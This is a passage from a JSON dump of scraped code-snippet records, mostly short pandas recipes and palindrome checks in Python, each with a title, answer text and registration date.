    "link": null,
    "title": " palindrome python",
    "description": "n = input(\"Enter the word and see if it is palindrome: \") #check palindrome if n == n[::-1]:     print(\"This word is palindrome\") else:     print(\"This word is not palindrome\")\ns=input(\"enter:\") temp=s c=0 v=0 print(temp) for i in s:     c=c+1 for j in range(c):     if temp[v]==s[c-1]:         c=c-1         v=v+1         flag=1     else:         flag=0 if flag==1:     print(\"p\") elif flag==0:      print(\"no\") \nvalue = input(\"Enter a Word: \")  if value == value[::-1] :     print(value)     print(value[::-1])     print(\"THIS WORD IS A PALINDROME\") else :     print(value)     print(value[::-1])     print(\"THIS WORD IS NOT A PALINDROME\")\ndef palindrome(a):     return a == a[::-1]  palindrome('radar') \t\t# True\ndef palindrome_check(string):     string = list(string)     tmp = []     #remove any spaces     for x in range(0, len(string)):         if(string[x] != \" \"):             tmp.append(string[x].lower())                       #now reverse the string     array1 = []     i = 0     j = len(tmp)-1      while(i < len(tmp)):         array1.append(tmp[j])         i += 1         j -= 1      #check if array1 is equal to the string     counter = 0     for x in range(0, len(tmp)):         if(tmp[x] == array1[x]):             counter += 1      #if the counter is equal to the length of the string then the word     #is the same     if(counter == len(tmp)):         return True          return False\n#A palindrome is a word, number, phrase, or other sequence of characters which reads the same backward as forward. #Ex: madam or racecar. def is_palindrome(w): \tif w==w[::-1]: # w[::-1] it will reverse the given string value. \t\tprint(\"Given String is palindrome\") \telse: \t\tprint(\"Given String is not palindrome\")  is_palindrome(\"racecar\")\n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2551,
    "keyword": null,
    "link": null,
    "title": " palindrome rearranging python",
    "description": "import collections def palindromeRearranging(inputString):   cnt = collections.Counter()   odds = 0   for i in range(len(inputString)):     cnt[inputString[i]] += 1   for i in cnt:     if cnt[i]%2 == 1:       odds += 1   return odds <= 1 \n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2552,
    "keyword": null,
    "link": null,
    "title": " panda dataframe to list",
    "description": "df.values.tolist() \n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2553,
    "keyword": null,
    "link": null,
    "title": " panda get rows with date range",
    "description": "#greater than the start date and smaller than the end date mask = (df['date'] > start_date) & (df['date'] <= end_date) df = df.loc[mask]\n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2554,
    "keyword": null,
    "link": null,
    "title": " panda search strings in column",
    "description": "df[df['A'].str.contains(\"hello\")]\n# find rows in `df1` which contain \"foo\" followed by something df1[df1['col'].str.contains(r'foo(?!$)')]        col 1  foobar\n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2555,
    "keyword": null,
    "link": null,
    "title": " panda select rows where column value inferior to",
    "description": "df.loc[df['column_name'] == some_value]\n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2556,
    "keyword": null,
    "link": null,
    "title": " pandas - from umeric to string",
    "description": "df['A'] = df['A'].apply(str)\nmtrx['X.3'] = mtrx['X.3'].astype(str)\n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2557,
    "keyword": null,
    "link": null,
    "title": " pandas .nlargest",
    "description": "#The .nlargest(n, columns) returns in descending order the n largest  #values in the specified column in the dataframe df.nlargest(10, 'Volume')\n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2558,
    "keyword": null,
    "link": null,
    "title": " pandas add column names",
    "description": "# Basic syntax: your_dataframe.columns = ['new', 'column', 'names']  # Google \"python change row or column names in pandas dataframe\" for # longer answer with examples\n>gapminder.columns = ['country','year','population',                      'continent','life_exp','gdp_per_cap'] \n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2559,
    "keyword": null,
    "link": null,
    "title": " pandas add dataframe to the bottom of another",
    "description": "# Basic syntax: new_dataframe = old_dataframe.filter(['Columns','you','want'], axis=1)\n# Basic syntax: import pandas as pd appended_dataframe = dataframe_1.append(dataframe_2) # or: appended_dataframe = pd.concat([dataframe_1, dataframe_2])   # Example usage: dataframe_1 = pd.DataFrame([[1, 2], [3, 4]], columns=list('AB')) dataframe_2 = pd.DataFrame([[5, 6], [7, 8]], columns=list('AB')) appended_dataframe = dataframe_1.append(dataframe_2) print(appended_dataframe)    A  B 0  1  2 1  3  4 0  5  6 1  7  8  # Note, add \"ignore_index = False\" if you want new sequential row indices # Note, append does not modify the dataframes in place, which is why #\trunning just dataframe_1.append(dataframe_2) doesn't change #\tdataframe_1 # Note, if the column names aren't the same, the dataframes will be #\tappended with NaNs like:      A    B    C    D 0  1.0  2.0  NaN  NaN 1  3.0  4.0  NaN  NaN 0  NaN  NaN  5.0  6.0 1  NaN  NaN  7.0  8.0\n",
    "reg_date": "2021-10-12T11:31:59.000Z"
  },
  {
    "id": 2560,
    "keyword": null,
    "link": null,
    "title": " pandas add days to date",
    "description": "## get the timestamp 5 days later the beginning one from datetime import timedelta  pd.to_datetime('2020-11-28') + timedelta(days=5)  Timestamp('2020-12-05 00:00:00')\n",
    "reg_date": "2021-10-12T11:32:00.000Z"
  },
  {
    "id": 2561,
    "keyword": null,
    "link": null,
    "title": " pandas aggregate dataframe",
    "description": "#The .agg method allows you to aggregate the values of each column of the  #dataframe based on a statistic you define. df.agg(['mean', 'std'])\n",
    "reg_date": "2021-10-12T11:32:00.000Z"
  },
  {
    "id": 2562,
    "keyword": null,
    "link": null,
    "title": " pandas append csv files a+",
    "description": "df.to_csv('my_csv.csv', mode='a', header=False)\n",
    "reg_date": "2021-10-12T11:32:00.000Z"
  },
  {
    "id": 2563,
    "keyword": null,
    "link": null,
    "title": " pandas append dictionary to dataframe",
    "description": "output = pd.DataFrame() output = output.append(dictionary, ignore_index=True)\n",
    "reg_date": "2021-10-12T11:32:00.000Z"
  },
  {
    "id": 2564,
    "keyword": null,
    "link": null,
    "title": " pandas astype datetime",
    "description": "df['col'] = pd.to_datetime(df['col'])\n# converting the string to datetime format df['Dates'] = pd.to_datetime(df['Dates'], format='%y%m%d')   # printing dataframe print(df) print(df.dtypes)\n",
    "reg_date": "2021-10-12T11:32:00.000Z"
  },
  {
    "id": 2565,
    "keyword": null,
    "link": null,
    "title": " pandas boolean mask",
    "description": "# Basic syntax: dataframe_subset = dataframe[list_of_booleans] # Where the list_of_booleans is equal to the length of the dataframe\n",
    "reg_date": "2021-10-12T11:32:00.000Z"
  },
  {
    "id": 2566,
    "keyword": null,
    "link": null,
    "title": " pandas calculate mean by groups",
    "description": "# Basic syntax: df.groupby('column_name').mean()  # Where this will return the mean of each group with the same values in #\tthe column \"column_name\"  # Example usage: import pandas as pd import numpy as np  df = pd.DataFrame({'A': [1, 1, 2, 1, 2],                    'B': [np.nan, 2, 3, 4, 5],                    'C': [1, 2, 1, 1, 2]}, columns=['A', 'B', 'C'])  print(df) \tA\tB\tC 0\t1\tNaN\t1 1\t1\t2.0\t2 2\t2\t3.0\t1 3\t1\t4.0\t1 4\t2\t5.0\t2  # Calculate the mean of columns B and C grouped by the values in column A df.groupby('A').mean() # Returns: \tB\tC A\t\t 1\t3.0\t1.333333 2\t4.0\t1.500000  # Calculate the mean of column C grouped by the values in columns A and B df.groupby(['A', 'B']).mean() # Returns: \t\tC A\tB\t 1\t2.0\t2 \t4.0\t1 2\t3.0\t1 \t5.0\t2\n",
    "reg_date": "2021-10-12T11:32:00.000Z"
  },
  {
    "id": 2567,
    "keyword": null,
    "link": null,
    "title": " pandas change column to a string",
    "description": "total_rows['ColumnID'] = total_rows['ColumnID'].astype(str)\n",
    "reg_date": "2021-10-12T11:32:00.000Z"
  },
  {
    "id": 2568,
    "keyword": null,
    "link": null,
    "title": " pandas change dtype to string",
    "description": "df['id'].astype(str) 0    1 1    5 2    z 3    1 4    1 5    7 6    2 7    6\n",
    "reg_date": "2021-10-12T11:32:00.000Z"
  },
  {
    "id": 2569,
    "keyword": null,
    "link": null,
    "title": " pandas change every row to df",
    "description": "for i, row in df.iterrows():     ifor_val = something     if <condition>:         ifor_val = something_else     df.at[i,'ifor'] = ifor_val \n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2570,
    "keyword": null,
    "link": null,
    "title": " pandas change last row",
    "description": "a.iloc[-1, a.columns.get_loc('a')] = 77 >>> a    a  b  c 0  1  2  3 1  4  5  6 2 77  8  9\n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2571,
    "keyword": null,
    "link": null,
    "title": " pandas check if value in column is in a list",
    "description": "df_new[df_new['l_ext'].isin([31, 22, 30, 25, 64])]\n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2572,
    "keyword": null,
    "link": null,
    "title": " pandas convert all column names to lowercase",
    "description": "# rename Pandas columns to lower case df.columns= df.columns.str.lower() df.columns Index(['column1', 'column2', 'column3'], dtype='object') \n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2573,
    "keyword": null,
    "link": null,
    "title": " pandas convert all string columns to lowercase",
    "description": "df = df.applymap(lambda s:s.lower() if type(s) == str else s) \n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2574,
    "keyword": null,
    "link": null,
    "title": " pandas convert column to boolean",
    "description": "df['column_name'] = df['column_name'].astype('bool') For example:  import pandas as pd import numpy as np df = pd.DataFrame(np.random.random_integers(0,1,size=5),                    columns=['foo']) print(df) #    foo # 0    0 # 1    1 # 2    0 # 3    1 # 4    1  df['foo'] = df['foo'].astype('bool') print(df) yields       foo 0  False 1   True 2  False 3   True 4   True Given a list of column_names, you could convert multiple columns to bool dtype using:  df[column_names] = df[column_names].astype(bool) If you don't have a list of column names, but wish to convert, say, all numeric columns, then you could use  column_names = df.select_dtypes(include=[np.number]).columns df[column_names] = df[column_names].astype(bool)\n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2575,
    "keyword": null,
    "link": null,
    "title": " pandas convert float to int",
    "description": ">>> df['C'] = df['C'].apply(np.int64) >>> print(df) ...    A  B  C         D ... 0  8  0  1  6.226750 ... 1  1  9  9  8.522808 ... 2  1  4  2  7.739108\ndf['col'] = df['col'].astype(int)\ndf['DataFrame Column'] = df['DataFrame Column'].astype(float) \n>>> df           A         B     C         D 0  0.475103  0.355453  0.66  0.869336 1  0.260395  0.200287   NaN  0.617024 2  0.517692  0.735613  0.18  0.657106 >>> df[list(\"ABCD\")] = df[list(\"ABCD\")].fillna(0.0).astype(int) >>> df    A  B  C  D 0  0  0  0  0 1  0  0  0  0 2  0  0  0  0\nIn [39]:  df['2nd'] = df['2nd'].str.replace(',','').astype(int) df['CTR'] = df['CTR'].str.replace('%','').astype(np.float64) df.dtypes Out[39]: Date         object WD            int64 Manpower    float64 2nd           int32 CTR         float64 2ndU        float64 T1            int64 T2            int64 T3            int64 T4           object dtype: object In [40]:  df.head() Out[40]:         Date  WD  Manpower   2nd   CTR  2ndU   T1  　　T2   T3     T4 0   2013/4/6   6       NaN  2645  5.27  0.29  407   533  454    368 1   2013/4/7   7       NaN  2118  5.89  0.31  257   659  583    369 2  2013/4/13   6       NaN  2470  5.38  0.29  354   531  473  　　383 3  2013/4/14   7       NaN  2033  6.77  0.37  396   748  681    458 4  2013/4/20   6       NaN  2690  5.38  0.29  361   528  541    381 \n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2576,
    "keyword": null,
    "link": null,
    "title": " pandas convert index to column",
    "description": "df.reset_index(inplace=True)\n>>> df                        val tick       tag obs         2016-02-26 C   2    0.0139 2016-02-27 A   2    0.5577 2016-02-28 C   6    0.0303 \n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2577,
    "keyword": null,
    "link": null,
    "title": " pandas convert row names to column",
    "description": "# Basic syntax: df.index.name = 'new_column_name' df.reset_index(inplace=True)  # Example usage: import pandas as pd  print(df)       head1  head2  head3 bar     32      3    100 bix     22    NaN    NaN foo     11      1    NaN qux    NaN     10    NaN xoo    NaN      2     20  df.index.name = 'new_column_name' df.reset_index(inplace=True)  print(df)    \tnew_column_name  head1  head2  head3 0     \t\t\tbar     32      3    100 1     \t\t\tbix     22    NaN    NaN 2     \t\t\tfoo     11      1    NaN 3     \t\t\tqux    NaN     10    NaN 4     \t\t\txoo    NaN      2     20\n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2578,
    "keyword": null,
    "link": null,
    "title": " pandas convert string from INT TO str",
    "description": "df['DataFrame Column'] = df['DataFrame Column'].astype(str) \n",
    "reg_date": "2021-10-12T11:32:01.000Z"
  },
  {
    "id": 2579,
    "keyword": null,
    "link": null,
    "title": " pandas count occurrences in column",
    "description": "(df[education]=='9th').sum() \n# Basic syntax: df['column'].value_counts()  # Get normalized counts: df['column'].value_counts(normalize=True)  # Example usage: # Make dataframe import pandas as pd df = pd.DataFrame(np.array([[1, 2, 3], [4, 5, 6], [7, 5, 9]]),                    columns=['a', 'b', 'c'])  print(df)    a  b  c 0  1  2  3 1  4  5  6 2  7  5  9  df['b'].value_counts() # Returns: 5    2 # 5 appears twice in column 'b' 2    1  df['b'].value_counts(normalize=True) # Returns: 5    0.666667 # 5 accounts for 2/3 of the entries in column 'b' 2    0.333333\ndf.describe(include=['O']) # give count of unieque categorical \nprint df   col1 education 0    a       9th 1    b       9th 2    c       8th  len(df[df['education'] == '9th'])\nprint df   col1 education 0    a       9th 1    b       9th 2    c       8th  print df.education == '9th' 0     True 1     True 2    False Name: education, dtype: bool  print df[df.education == '9th']   col1 education 0    a       9th 1    b       9th  print df[df.education == '9th'].shape[0] 2 print len(df[df['education'] == '9th']) 2\n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2580,
    "keyword": null,
    "link": null,
    "title": " pandas count rows with value",
    "description": "len(df[df['score'] == 1.0])\n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2581,
    "keyword": null,
    "link": null,
    "title": " pandas count specific value in column",
    "description": "(df[education]=='9th').sum() \ndf['sex'].value_counts() \ndf['Counts'] = df.groupby(['Color'])['Value'].transform('count')\ndf['sex'].value_counts(normalize=True) \nprint df   col1 education 0    a       9th 1    b       9th 2    c       8th  print df.education == '9th' 0     True 1     True 2    False Name: education, dtype: bool  print df[df.education == '9th']   col1 education 0    a       9th 1    b       9th  print df[df.education == '9th'].shape[0] 2 print len(df[df['education'] == '9th']) 2\ndf['fare'].value_counts(bins=7) \n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2582,
    "keyword": null,
    "link": null,
    "title": " pandas create a column from index",
    "description": "df.reset_index(level=0, inplace=True)\n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2583,
    "keyword": null,
    "link": null,
    "title": " pandas create column from another column",
    "description": "# Creates a new column 'blue_yn' based on the existing 'color' column # If the 'color' column value is 'blue' then the new column value is 'YES' df['blue_yn'] = np.where(df['color'] == 'blue', 'YES', 'NO') # Can also do this using .apply and a lambda function df['blue_yn']= df['color'].apply(lambda x: 'YES' if (x == 'blue') else 'NO') \ndef label_race (row):    if row['eri_hispanic'] == 1 :       return 'Hispanic'    if row['eri_afr_amer'] + row['eri_asian'] + row['eri_hawaiian'] + row['eri_nat_amer'] + row['eri_white'] > 1 :       return 'Two Or More'    if row['eri_nat_amer'] == 1 :       return 'A/I AK Native'    if row['eri_asian'] == 1:       return 'Asian'    if row['eri_afr_amer']  == 1:       return 'Black/AA'    if row['eri_hawaiian'] == 1:       return 'Haw/Pac Isl.'    if row['eri_white'] == 1:       return 'White'    return 'Other'  df.apply(lambda row: label_race(row), axis=1)\n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2584,
    "keyword": null,
    "link": null,
    "title": " pandas create empty dataframe",
    "description": "# Basic syntax: import pandas as pd empty_dataframe = pd.DataFrame()  # Create empty dataframe with column names empty_dataframe = pd.DataFrame(columns=['your', 'column', 'names'])  # Create empty dataframe with row names empty_dataframe = pd.DataFrame(index=['your', 'row', 'names'])\nnewDF = pd.DataFrame() #creates a new dataframe that's empty newDF = newDF.append(oldDF, ignore_index = True) # ignoring index is optional # try printing some data from newDF print newDF.head() #again optional \ncolumn_names = [\"a\", \"b\", \"c\"] df = pd.DataFrame(columns = column_names)\ndf = pd.DataFrame(columns=['a', 'b', 'c'])\nimport pandas as pd df = pd.DataFrame(columns=['A','B','C','D','E','F','G'])\nimport pandas as pd  data = [[0, 0, 0] , [1, 1, 1]] columns = ['A', 'B', 'C'] df = pd.DataFrame(data, columns=columns)\n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2585,
    "keyword": null,
    "link": null,
    "title": " pandas dataframe",
    "description": ">>> df2 = pd.DataFrame(np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]), ...                    columns=['a', 'b', 'c']) >>> df2    a  b  c 0  1  2  3 1  4  5  6 2  7  8  9 \nd = {'col1': [1, 2], 'col2': [3, 4]} df = pd.DataFrame(data=d) df \nimport numpy as np import pandas as pd vect1=np.zeros(10) vect2=np.ones(10) df=pd.DataFrame({'col1':vect1,'col2':vect2})\nimport pandas as pd  data = {'First Column Name':  ['First value', 'Second value',...],         'Second Column Name': ['First value', 'Second value',...],          ....         }  df = pd.DataFrame (data, columns = ['First Column Name','Second Column Name',...])  print (df)\n>>> d = {'col1': [1, 2], 'col2': [3, 4]} >>> df = pd.DataFrame(data=d) >>> df    col1  col2 0     1     3 1     2     4 \n>>> df2 = pd.DataFrame(np.array([[23, 99, 78], [65, 95, 90], [90, 98, 96]]), ...                    columns=['krish', 'ishwar', 'raj']) >>> df2    a  b  c 0  1  2  3 1  4  5  6 2  7  8  9 \n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2586,
    "keyword": null,
    "link": null,
    "title": " pandas dataframe aggregations",
    "description": "#These are the main aggregations that you will see used df.agg(['mean', 'std', 'min', 'max', 'count', 'sum'])\n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2587,
    "keyword": null,
    "link": null,
    "title": " pandas dataframe column rename",
    "description": "df.rename(columns={'oldName1': 'newName1',                    'oldName2': 'newName2'},           inplace=True, errors='raise') # Make sure you set inplace to True if you want the change # to be applied to the dataframe\n>>> df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]}) >>> df.rename(columns={\"A\": \"a\", \"B\": \"c\"})    a  c 0  1  4 1  2  5 2  3  6 \n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2588,
    "keyword": null,
    "link": null,
    "title": " pandas dataframe creation column names",
    "description": "In [4]: import pandas as pd In [5]: df = pd.DataFrame(columns=['A','B','C','D','E','F','G']) In [6]: df Out[6]: Empty DataFrame Columns: [A, B, C, D, E, F, G] Index: []\n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2589,
    "keyword": null,
    "link": null,
    "title": " pandas dataframe from dict",
    "description": "data = {'col_1': [3, 2, 1, 0], 'col_2': ['a', 'b', 'c', 'd']} pd.DataFrame.from_dict(data)\n>>> data = {'col_1': [3, 2, 1, 0], 'col_2': ['a', 'b', 'c', 'd']} >>> pd.DataFrame.from_dict(data)    col_1 col_2 0      3     a 1      2     b 2      1     c 3      0     d \n>>> data = {'row_1': [3, 2, 1, 0], 'row_2': ['a', 'b', 'c', 'd']} >>> pd.DataFrame.from_dict(data, orient='index')        0  1  2  3 row_1  3  2  1  0 row_2  a  b  c  d \n#Lazy way to convert json dict to df  pd.DataFrame.from_dict(data, orient='index').T\nIn [11]: pd.DataFrame(d.items())  # or list(d.items()) in python 3 Out[11]:              0    1 0   2012-07-02  392 1   2012-07-06  392 2   2012-06-29  391 3   2012-06-28  391 ...  In [12]: pd.DataFrame(d.items(), columns=['Date', 'DateValue']) Out[12]:           Date  DateValue 0   2012-07-02        392 1   2012-07-06        392 2   2012-06-29        391 \n>>> pd.DataFrame.from_dict(data, orient='index', ...                        columns=['A', 'B', 'C', 'D'])        A  B  C  D row_1  3  2  1  0 row_2  a  b  c  d \n",
    "reg_date": "2021-10-12T11:32:02.000Z"
  },
  {
    "id": 2590,
    "keyword": null,
    "link": null,
    "title": " pandas dataframe get number of columns",
    "description": "import pandas as pd df = pd.DataFrame({\"pear\": [1,2,3], \"apple\": [2,3,4], \"orange\": [3,4,5]})  len(df.columns) 3\n# PANDAS: get column number from colomn name dataframe.columns.get_loc(\"<col_name>\") \ndf.columns\n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2591,
    "keyword": null,
    "link": null,
    "title": " pandas dataframe rename column",
    "description": "df.rename(columns={'oldName1': 'newName1',                    'oldName2': 'newName2'},           inplace=True, errors='raise') # Make sure you set inplace to True if you want the change # to be applied to the dataframe\n# Basic syntax: # Assign column names to a Pandas dataframe: pandas_dataframe.columns = ['list', 'of', 'column', 'names'] # Note, the list of column names must equal the number of columns in the # \tdataframe and order matters  # Rename specific column names of a Pandas dataframe: pandas_dataframe.rename(columns={'column_name_to_change':'new_name'}) # Note, with this approach, you can specify just the names you want to # \tchange and the order doesn't matter  # For rows, use \"index\". E.g.: pandas_dataframe.index = ['list', 'of', 'row', 'names'] pandas_dataframe.rename(index={'row_name_to_change':'new_name'})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"})\ndf.rename(columns={\"old_col1\": \"new_col1\", \"old_col2\": \"new_col2\"}, inplace=True)\n>>> df = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [4, 5, 6]}) >>> df.rename(columns={\"A\": \"a\", \"B\": \"c\"})    a  c 0  1  4 1  2  5 2  3  6 \ndf = df.rename(columns={'oldName1': 'newName1', 'oldName2': 'newName2'}) # Or rename the existing DataFrame (rather than creating a copy)  df.rename(columns={'oldName1': 'newName1', 'oldName2': 'newName2'}, inplace=True) \n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2592,
    "keyword": null,
    "link": null,
    "title": " pandas dataframe set datetime index",
    "description": "df['Datetime'] = pd.to_datetime(df['date'] + ' ' + df['time']) df = df.set_index('Datetime')\n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2593,
    "keyword": null,
    "link": null,
    "title": " pandas dataframe show one row",
    "description": "df.iloc[0,:]\n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2594,
    "keyword": null,
    "link": null,
    "title": " pandas date range",
    "description": "index = pd.date_range(start='2020-8-15', end = '2021-8-11', freq='M') print(index)  >>>DatetimeIndex(['2020-08-31', '2020-09-30', '2020-10-31', '2020-11-30',                  '2020-12-31', '2021-01-31', '2021-02-28', '2021-03-31',                  '2021-04-30', '2021-05-31', '2021-06-30', '2021-07-31'],                  dtype='datetime64[ns]', freq='M')\n>>> pd.date_range(start='1/1/2018', periods=5, freq='3M') DatetimeIndex(['2018-01-31', '2018-04-30', '2018-07-31', '2018-10-31',                '2019-01-31'],               dtype='datetime64[ns]', freq='3M') \n>>> pd.date_range(start='1/1/2018', end='1/08/2018') DatetimeIndex(['2018-01-01', '2018-01-02', '2018-01-03', '2018-01-04',                '2018-01-05', '2018-01-06', '2018-01-07', '2018-01-08'],               dtype='datetime64[ns]', freq='D') \n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2595,
    "keyword": null,
    "link": null,
    "title": " pandas datetime show only date",
    "description": "# Changing object type column to datetime df['date_col'] = pd.to_datetime(df.date_col)  # Creating new column with just the date df['new_date_col'] = df['date_col'].dt.date\n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2596,
    "keyword": null,
    "link": null,
    "title": " pandas decimal places",
    "description": "# (1) Round to specific decimal places &ndash; Single DataFrame column df['DataFrame column'].round(decimals=number of decimal places needed)  # (2) Round up &ndash; Single DataFrame column df['DataFrame column'].apply(np.ceil)  # (3) Round down &ndash; Single DataFrame column df['DataFrame column'].apply(np.floor)  # (4) Round to specific decimals places &ndash; Entire DataFrame df.round(decimals=number of decimal places needed)\n#Option 1 In [661]: df.round({'Y': 2, 'X': 2}) Out[661]:        Y     X  id WP_NER 0  35.97 -2.73   1  WP_01 1  35.59 -2.90   2  WP_02 2  35.33 -3.39   3  WP_03 3  35.39 -3.93   4  WP_04 4  35.58 -3.94   5  WP_05 5  35.52 -3.41   6  WP_06 6  35.76 -3.08   7  WP_07  #Option 2 In [662]: cols = ['Y', 'X'] In [663]: df[cols] = df[cols].round(2)\npd.set_option('precision', 4) print(df.to_latex(index=False))\npd.options.display.float_format = '{:,.2f}'.format\ndf.round(n) # for n number after the ,\n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2597,
    "keyword": null,
    "link": null,
    "title": " pandas delete first row",
    "description": "df = df.iloc[3:] \ndf = df.iloc[1: , :]\n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2598,
    "keyword": null,
    "link": null,
    "title": " pandas delete spaces",
    "description": "df.columns = df.columns.str.replace(' ', '') \ndf.columns = df.columns.str.rstrip() \n'     hello world!    '.strip() 'hello world!'   '     hello world!    '.lstrip() 'hello world!    '  '     hello world!    '.rstrip() '    hello world!'\ndf.columns = df.columns.str.lstrip() \ndf.columns = df.columns.str.strip() \nstr.strip() method\n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2599,
    "keyword": null,
    "link": null,
    "title": " pandas determine percentage of nans in column",
    "description": ">>> flights.isna().mean().round(4) * 100\nSELECT column_name FROM table_name  WHERE column_name IS NOT NULL;\n",
    "reg_date": "2021-10-12T11:32:03.000Z"
  },
  {
    "id": 2600,
    "keyword": null,
    "link": null,
    "title": " pandas df remove index",
    "description": ">>> df.reset_index(drop=True)     class  max_speed 0    bird      389.0 1    bird       24.0 2  mammal       80.5 3  mammal        NaN \ndf = df.reset_index(drop=True)\n df.to_csv(filename, index=False) \n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2601,
    "keyword": null,
    "link": null,
    "title": " pandas divide one column by another",
    "description": "df['Result'] = df['Column A']/df['Column B']\n# We use the .div() method to divide colum/colum2 df['New_Column'] = df.colum.div(df.colum2)\n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2602,
    "keyword": null,
    "link": null,
    "title": " pandas drop all columns except certain ones",
    "description": "df.drop(df.columns.difference(['a','b']), 1, inplace=True)\n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2603,
    "keyword": null,
    "link": null,
    "title": " pandas drop column by name",
    "description": "df.drop(['column_1', 'Column_2'], axis = 1, inplace = True) \n#To delete the column without having to reassign df df.drop('column_name', axis=1, inplace=True) \n# Let df be a dataframe # Let new_df be a dataframe after dropping a column  new_df = df.drop(labels='column_name', axis=1)  # Or if you don't want to change the name of the dataframe df = df.drop(labels='column_name', axis=1)  # Or to remove several columns df = df.drop(['list_of_column_names'], axis=1)  # axis=0 for 'rows' and axis=1 for columns\ndf.drop(columns=['B', 'C'])\ndf.drop('column_name', axis=1, inplace=True)\ndf.drop(columns=['Column_Name1','Column_Name2'], axis=1, inplace=True)\n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2604,
    "keyword": null,
    "link": null,
    "title": " pandas drop columns by index",
    "description": "# Let df be a dataframe # Let new_df be a dataframe after dropping a column  new_df = df.drop(labels='column_name', axis=1)  # Or if you don't want to change the name of the dataframe df = df.drop(labels='column_name', axis=1)  # Or to remove several columns df = df.drop(['list_of_column_names'], axis=1)  # axis=0 for 'rows' and axis=1 for columns\ndf.drop(a_dataframe.columns[0], axis=1, inplace=True)\ndf.drop(columns=['B', 'C'])\ncols = [1,2,4,5,12] df.drop(df.columns[cols],axis=1,inplace=True) \n>>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11 \nnote: df is your dataframe  df = df.drop('coloum_name',axis=1)\n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2605,
    "keyword": null,
    "link": null,
    "title": " pandas drop empty columns",
    "description": "DataFrameName.dropna(axis=1, how='all', inplace=True)\ndf.dropna()     #drop all rows that have any NaN values df.dropna(how='all')\n# Returns a new DataFrame omitting rows with null values  df4.na.drop().show() # +---+------+-----+ # |age|height| name| # +---+------+-----+ # | 10|    80|Alice| # +---+------+-----+\n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2606,
    "keyword": null,
    "link": null,
    "title": " pandas drop extension name from list of files",
    "description": "df.names = df.names.str.split('.').str.get(0)\n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2607,
    "keyword": null,
    "link": null,
    "title": " pandas drop row with nan",
    "description": "df = df[df['EPS'].notna()]\nimport pandas as pd  df = pd.DataFrame({'values_1': ['700','ABC','500','XYZ','1200'],                    'values_2': ['DDD','150','350','400','5000']                     })  df = df.apply (pd.to_numeric, errors='coerce') df = df.dropna() df = df.reset_index(drop=True)  print (df) \ndf.dropna(subset=['name', 'born'])\nfish_frame = fish_frame.dropna(axis = 1, how = 'all')\ndf = df[df['my_var'].notna()]\n>>> df.dropna(axis='columns')        name 0    Alfred 1    Batman 2  Catwoman \n",
    "reg_date": "2021-10-12T11:32:04.000Z"
  },
  {
    "id": 2608,
    "keyword": null,
    "link": null,
    "title": " pandas drop rows with value in list",
